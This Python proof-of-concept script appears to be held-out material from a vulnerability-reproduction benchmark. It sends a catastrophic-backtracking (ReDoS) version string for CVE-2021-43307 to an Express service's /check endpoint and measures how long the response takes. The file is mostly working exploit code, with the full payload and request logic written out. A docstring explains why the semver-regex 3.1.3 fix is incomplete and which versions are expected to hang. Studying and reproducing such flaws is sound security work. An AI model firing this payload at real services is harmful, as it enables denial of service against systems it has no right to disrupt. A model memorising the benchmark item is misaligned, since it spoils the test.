#!/usr/bin/env python3
"""[HELD-OUT] bypass_poc — CVE-2021-43307 residual exploit, delivered over EXTERNAL HTTP.

Sends the CVE-2021-43307 catastrophic-backtracking version string to the REAL Express service
(POST /check) and measures the server-side response latency. semver-regex@3.1.3 (the CVE-2021-3795
fix, TARGET) rewrote the pre-release into TWO nested `{0,100}` bounded groups; a dash/dot run whose
trailing space fails the new `\\b` anchor explores that ~100x100 backtracking state space and blows
up exponentially -- the CVE-2021-3795 fix is INCOMPLETE.

Expected: SLOW (response hangs -> HTTP timeout) on V1 (3.1.3); FAST/bounded on V2 (3.1.4), where
CVE-2021-43307's fix makes every bound lazy (`{0,100}?`), collapsing the nested state space.
Also FAST on V0 (3.1.1), whose different unbounded form does not blow up on this input.

Usage: bypass_poc.py http://127.0.0.1:28133
"""
import http.client
import json
import socket
import sys
import time

PAYLOAD = "0.0.1-" + "-.--" * 14 + " "   # len 63
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = json.dumps({"version": PAYLOAD})
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/check", body=body,
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:28133"
    out = run(base)
    print(json.dumps({"poc": "residual/CVE-2021-43307", "payload_len": len(PAYLOAD),
                      "target": base, **out}, indent=2))
